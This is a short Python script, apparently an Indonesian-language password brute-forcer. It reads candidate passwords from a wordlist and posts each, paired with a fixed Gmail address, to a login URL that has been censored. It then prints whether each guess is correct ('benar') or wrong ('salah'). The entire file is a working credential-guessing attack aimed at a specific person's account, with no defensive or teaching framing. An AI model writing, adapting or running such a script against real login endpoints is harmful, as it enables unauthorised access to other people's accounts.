import requests
from termcolor import cprint

passwordlist = open('passwords.txt', 'r')
email = 'nona@gmail.com'

for line in passwordlist:
    password = line.strip()
    url = '#Censored#'
    data = {'user': email,
             'pass': password}

    req = requests.post(url, data=data)
    content = req.content.decode('utf-8')

    if content == '1':
        cprint(f'{password} benar', 'red')
        break
    else:
        cprint(f'{password} salah', 'red')





